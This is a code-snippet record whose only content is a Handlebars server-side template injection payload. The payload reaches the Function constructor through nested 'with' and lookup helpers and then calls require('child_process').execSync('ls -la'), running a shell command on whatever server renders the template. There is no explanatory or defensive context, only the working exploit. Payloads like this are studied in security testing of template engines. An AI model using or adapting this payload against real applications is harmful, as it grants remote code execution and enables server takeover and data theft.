---
id: efc8c13d-b2f9-47aa-9be8-bb1fad232798
type: code
language: handlebars
verified: false
created_at: '2023-04-06T03:56:39.251530+00:00'
updated_at: '2023-04-10T20:23:36.729023+00:00'
---

# Code Snippet efc8c13d

**Language**: handlebars

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
